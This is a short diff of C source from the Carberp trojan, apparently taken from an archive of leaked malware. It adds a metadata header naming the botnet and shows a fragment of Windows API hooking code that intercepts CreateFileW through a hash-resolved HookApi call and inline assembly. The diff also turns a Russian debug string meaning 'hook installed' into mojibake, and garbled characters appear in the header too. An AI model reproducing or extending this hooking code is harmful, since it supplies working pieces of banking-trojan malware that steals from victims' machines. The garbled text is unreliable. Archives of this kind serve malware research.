@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 #include "BSS.h"
 
 #include "Loader.h"
@@ -161,7 +172,7 @@ pOutputDebugStringA("lpFileName");
 void HookBSSCreateFileW()
 {
 	UnhookCreateFileW();
-	pOutputDebugStringA("хук поставлен");
+	pOutputDebugStringA("пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ");
 	if ( HookApi( 1, 0x8F8F102, (DWORD)&HOOK_BSSCreateFileW ) )
 	{
 		__asm mov [REAL_BSSCreateFileW], eax
